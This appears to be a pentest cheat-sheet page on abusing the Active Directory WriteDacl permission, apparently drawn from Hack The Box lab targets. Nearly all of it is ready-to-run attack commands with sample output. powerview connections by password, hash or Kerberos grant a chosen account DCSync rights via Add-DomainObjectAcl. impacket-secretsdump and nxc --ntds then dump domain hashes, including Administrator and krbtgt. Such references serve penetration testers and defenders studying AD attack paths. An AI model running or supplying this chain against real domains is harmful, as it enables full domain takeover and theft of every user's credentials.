---
title: "WriteDacl"
tags: ["Active Directory", "WriteDacl", "Credential Dumping", "Dcsync", "Powerview", "Windows", "Writedacl"]
---

{{< filter_buttons >}}

### Add DCsync Right to User

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active >}}powerview.py{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

#### 1. Connect

```console {class="password"}
# Password
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb'
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ntlm"}
# NTLM
powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>'
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc'
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$:Password123!@DC01.haze.htb' -k
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
powerview '<DOMAIN>/<USER>@<TARGET>' -H '<HASH>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -H '735c02c6b2dc54c3c8c6891f55279ebc' -k
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
powerview '<DOMAIN>/<USER>@<TARGET>' -k
```

```console {class="sample-code"}
$ powerview 'haze.htb/haze-it-backup$@DC01.haze.htb' -k --no-pass
╭─LDAPS─[dc01.haze.htb]─[HAZE\Haze-IT-Backup$]-[NS:<auto>]
╰─PV ❯ 
```

#### 2. Add DCsync Right

```console
Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync
```

```console {class="sample-code"}
(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
PV > Add-DomainObjectAcl -PrincipalIdentity 'WEB01$' -TargetIdentity 'DC=corp,DC=local' -Rights DCSync
[2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local
[2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local
[2024-10-01 12:51:36] DACL modified successfully!
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}
{{< tab set1-2 tab1 active >}}powerview{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}


#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
```

#### 2. Add DCsync Right

```console
Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

{{< /tabcontent >}}
{{< /tabcontent >}}

#### Secrets Dump

{{< tab set2 tab1 >}}impacket{{< /tab >}}
{{< tab set2 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console {class="password"}
# Password
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ntlm"}
# NTLM
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH>
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945 -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -k -no-pass
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console {class="password"}
# Password
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --ntds
```

```console {class="ntlm"}
# NTLM
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' --ntds
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> --ntds
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> --ntds
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache --ntds
```

{{< /tabcontent >}}